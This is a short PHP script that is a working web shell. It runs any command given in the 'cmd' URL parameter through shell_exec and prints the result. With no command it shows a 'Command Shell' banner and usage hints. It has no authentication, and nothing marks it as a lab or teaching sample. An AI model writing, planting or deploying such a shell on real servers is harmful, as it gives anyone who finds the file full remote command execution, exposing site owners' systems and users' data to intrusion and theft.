<?php
if(isset($_GET['cmd'])) {
    echo "<pre>"; 
    $output = shell_exec($_GET['cmd']);
    echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
    echo "</pre>";
} else {
    echo "<h3>Command Shell</h3>";
    echo "<p>Add ?cmd=your_command to URL</p>";
    echo "<p>Example: ?cmd=whoami</p>";
}
?>